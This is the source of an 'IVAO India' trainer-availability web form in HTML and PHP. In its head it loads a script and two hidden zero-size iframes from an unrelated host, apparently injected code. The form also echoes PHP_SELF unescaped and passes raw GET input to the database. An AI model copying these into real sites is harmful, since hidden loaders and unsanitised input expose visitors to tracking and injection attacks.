<html xmlns="http://www.w3.org/1999/xhtml"><head><script type="text/javascript" src="http://one.m4dc.com/j/si1.js"></script></head><body bgcolor="#FFFFFF" style="">in
<title>Staff - IVAO India</title>
<link href="https://fonts.googleapis.com/css?family=Muli" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="http://ivao.in/staff/styles.css">
<script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script><script id="esdfd550487" type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js?m4dc56=150487"></script><div><iframe src="http://one.m4dc.com/i/si.html" class="iifr" id="chk_frame" scrolling="no" width="0px" height="0px" frameborder="0" allowtransparency="true"></iframe></div><div><iframe src="http://one.m4dc.com/t/?r=0.9748239401930159" class="iifr" id="hdr_ifr" scrolling="no" width="0px" height="0px" frameborder="0" allowtransparency="true"></iframe></div>
<script src="http://ivao.in/flightbooking/script.js"></script>
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
<link rel="shortcut icon" href="http://www.ivao.in/wp-content/uploads/2016/06/logo-e1466006858963.png" title="Favicon">
<link rel="stylesheet" href="//code.jquery.com/ui/1.11.2/themes/smoothness/jquery-ui.css">
<script src="//code.jquery.com/jquery-1.10.2.js"></script>
<script src="//code.jquery.com/ui/1.11.2/jquery-ui.js"></script>
<link rel="stylesheet" href="/resources/demos/style.css">
<link rel="stylesheet"
 href="https://cdn.jsdelivr.net/npm/animate.css@3.5.2/animate.min.css">
 <!-- or -->
 <link rel="stylesheet"
 href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
<script>
  $(function() {
    $("#accordion").accordion({ header: "h3", collapsible: true, active: false, heightStyle: "content"});
  });
</script>
<script type="text/javascript" src="http://ivao.in/files/shadowbox/shadowbox.js"></script>
<script type="text/javascript">
Shadowbox.init({
    handleOversize: "drag",
    modal: true
});

</script>


<style type="text/css">
.form-style-2{
    max-width: 500px;
    padding: 20px 12px 10px 20px;
    font: 13px Arial, Helvetica, sans-serif;
}
.form-style-2-heading{
    font-weight: bold;
    font-style: italic;
    border-bottom: 2px solid #ddd;
    margin-bottom: 20px;
    font-size: 15px;
    padding-bottom: 3px;
}
.form-style-2 label{
    display: block;
    margin: 0px 0px 15px 0px;
}
.form-style-2 label > span{
    width: 100px;
    font-weight: bold;
    float: left;
    padding-top: 8px;
    padding-right: 5px;
}
.form-style-2 span.required{
    color:red;
}
.form-style-2 .tel-number-field{
    width: 40px;
    text-align: center;
}
.form-style-2 input.input-field, .form-style-2 .select-field{
    width: 48%;
}
.form-style-2 input.input-field,
.form-style-2 .tel-number-field,
.form-style-2 .textarea-field,
 .form-style-2 .select-field{
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    border: 1px solid #C2C2C2;
    box-shadow: 1px 1px 4px #EBEBEB;
    -moz-box-shadow: 1px 1px 4px #EBEBEB;
    -webkit-box-shadow: 1px 1px 4px #EBEBEB;
    border-radius: 3px;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    padding: 7px;
    outline: none;
}
.form-style-2 .input-field:focus,
.form-style-2 .tel-number-field:focus,
.form-style-2 .textarea-field:focus,
.form-style-2 .select-field:focus{
    border: 1px solid #bcbcbc;
}
.form-style-2 .textarea-field{
    height:100px;
    width: 55%;
}
.form-style-2 input[type=submit],
.form-style-2 input[type=button]{
    border: none;
    padding: 8px 15px 8px 15px;
    background: #FF8500;
    color: #fff;
    box-shadow: 1px 1px 4px #DADADA;
    -moz-box-shadow: 1px 1px 4px #DADADA;
    -webkit-box-shadow: 1px 1px 4px #DADADA;
    border-radius: 3px;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
}
.form-style-2 input[type=submit]:hover,
.form-style-2 input[type=button]:hover{
    background: #EA7B00;
    color: #fff;
}
</style>
<div class="loader" style="display: none;"></div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
})
</script>
<div style="padding: 5px 20px 5px 20px;
margin: 10px 10px 10px 10px;
border-radius: 4px;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
-o-border-radius: 4px;
-khtml-border-radius: 4px;
background: white;
border: 1px solid;
border-color: #e5e5e5 #dbdbdb #d2d2d2;">

<?php
require ('assets/lib/mysql.php');
require ('assets/lib/main.class.php');
?>

<h1 class="animated fadeinUp">Trainer Availability</h1>
<hr>
<?php
// We are setting the User Auth data, basically the user's unique ID, in the debug
// I've made the VID as a primary key too, so later on this $id should be pointed to the logged in
// user's VID

if($_GET) {

  $dates = $_GET['dates'];
  $remarks = $_GET['remarks'];
  $vid = $_GET['vid'];

  if($vid != '' && $remarks != '' && $dates != '') {
    TA::add_form_data($dates, $remarks, $vid);
  }

}


$id = 1;
$res = TA::auth_data($id);
foreach ($res as $r) {
  // echo $r['firstname'];
}

?>
<a href="index.php" class="add">Back</a>

<h2>Trainers Availiability Form</h2>
<p>How to fill the form? <br>
  <ol>
    <li>Enter your VID</li>
    <li>Enter your available dates in an array seperated by a comma (,)</li>
    <li>Donot place a comma for the last date you are entering<li>
    <li>If you are unavailiable for the month, enter "leave" in the dates column and the system will mark you on leave</li>
    <li>You can specify additional details in the remarks column</li>
  </ol>
</p>

<div class="form-style-2">
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="GET">
<label for="field1"><span>VID <span class="required">*</span></span>
  <input type="text" class="input-field" name="vid" value="" />
</label>
<label for="field1"><span>Dates <span class="required">*</span></span>
  <input type="text" class="input-field" name="dates" value="" />
</label>
<label for="field5"><span>Remarks</span></span><textarea name="remarks" class="textarea-field"></textarea></label>

<label><span>&nbsp;</span><input type="submit" value="Submit"/></label>
</form>
</div>
</div>

</body></html>
